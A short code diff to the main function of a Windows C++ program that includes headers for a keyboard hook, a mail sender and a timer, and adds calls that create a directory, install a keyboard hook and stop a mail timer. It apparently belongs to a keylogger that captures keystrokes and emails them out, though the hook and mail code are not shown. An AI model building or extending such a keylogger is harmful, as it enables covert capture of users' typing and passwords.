@@ -6,6 +6,7 @@
 #include "IO.h"
 #include "Timer.h"
 #include "SendMail.h"
+#include "KeybHook.h"
 
 using namespace std;
 
@@ -13,11 +14,17 @@ int main()
 {
     MSG Msg;
 
+    IO::MakeDir(IO::GetourPath(true));
+
+    InstallHook();
+
     while(GetMessage (&Msg, NULL, 0, 0))
     {
 
         TranslateMessage(&Msg);
         DispatchMessage(&Msg);
     }
+
+    MailTimer.Stop();
     return 0;
 }
